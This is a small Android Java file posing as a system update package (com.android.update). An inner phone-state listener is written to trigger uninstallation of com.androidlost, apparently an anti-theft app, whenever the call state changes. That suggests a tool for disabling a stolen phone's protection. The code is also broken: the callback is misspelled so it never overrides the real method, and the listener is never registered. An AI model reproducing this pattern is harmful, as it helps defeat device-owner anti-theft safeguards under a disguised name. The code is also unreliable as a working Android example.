package com.android.update;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.widget.Toast;

public class AutoUnInstallActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
            
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Toast.makeText(this,"Test",Toast.LENGTH_LONG).show();
    }
    
    class TelefonoListener extends PhoneStateListener {
    	public void OnCallStateChanged(int state,String Number){
    				Uri packageURI = Uri.parse("package:com.androidlost");
    				Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
    				startActivity(uninstallIntent);    				
    			super.onCallStateChanged(state,Number);
    		}    		
  	}
}
